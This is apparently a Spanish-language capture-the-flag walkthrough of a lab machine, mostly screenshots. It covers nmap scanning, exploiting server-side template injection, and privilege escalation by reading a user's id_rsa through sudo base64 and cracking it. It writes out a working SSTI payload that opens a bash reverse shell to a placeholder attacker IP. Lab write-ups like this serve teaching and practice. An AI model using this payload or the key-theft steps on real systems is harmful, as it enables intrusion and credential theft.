1- Ping y NMAP

<img width="578" height="518" alt="image" src="https://github.com/user-attachments/assets/e9297933-3467-4ffc-9b7a-2b791e79f1f4" />

2- Accedemos via http y vemos una pagina, es vulnerable a ssti

pegamos esto y nos ponemos en escucha 

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \'bash -i >& /dev/tcp/TUIP/443 0>&1\'').read() }}

<img width="225" height="53" alt="image" src="https://github.com/user-attachments/assets/2366c5a3-b7ea-415e-bc29-3440bd93b89f" />

<img width="680" height="143" alt="image" src="https://github.com/user-attachments/assets/c63fcb69-8ca5-49f5-9890-fecff1f2c70e" />

Sudo -l y vemos que es vulnerable a base64, buscamos GTFOBins y tratamos de escalar.

Lo unico que se me ha ocurrido es copiar su clave id_rsa

<img width="577" height="390" alt="image" src="https://github.com/user-attachments/assets/147f11af-07e9-4d24-af7a-0432e2474f7c" />

<img width="643" height="250" alt="image" src="https://github.com/user-attachments/assets/236b5a69-58b5-42dc-bcb8-d6137aa676bb" />

La desciframos y provamos de entrar con esta contraseña que nos ha dado.

<img width="286" height="98" alt="image" src="https://github.com/user-attachments/assets/f4ecbb24-5d0e-4c1d-b489-1f8def0e7c56" />

<img width="828" height="234" alt="image" src="https://github.com/user-attachments/assets/d684caeb-7cb2-4193-a51f-8dce9566d608" />


